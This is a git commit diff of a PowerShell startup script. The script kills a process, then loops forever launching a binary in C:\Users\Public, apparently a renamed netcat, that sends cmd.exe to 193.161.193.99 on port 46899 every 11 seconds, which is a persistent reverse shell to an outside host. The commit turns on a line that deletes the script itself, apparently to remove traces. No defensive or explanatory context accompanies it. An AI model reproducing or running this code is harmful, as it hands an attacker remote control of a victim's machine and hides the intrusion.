fca1f0e85c8856a8a908eb79fa22103bba2ff2f1
fullcaletaxixth <153169287+fullcaletaxixth@users.noreply.github.com>
2023-12-28 19:19:04 -0500

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -3,4 +3,4 @@ taskkill /F /IM lml.exe
 #C:\Users\seba\Downloads\lml.exe
 while ($true){C:\Users\Public\RNM.exe -nv 193.161.193.99 46899 -e cmd.exe; start-sleep 11}
 attrib -h C:\Users\Public\MyStartUp.ps1
-#del C:\Users\Public\MyStartUp.ps1
+del C:\Users\Public\MyStartUp.ps1
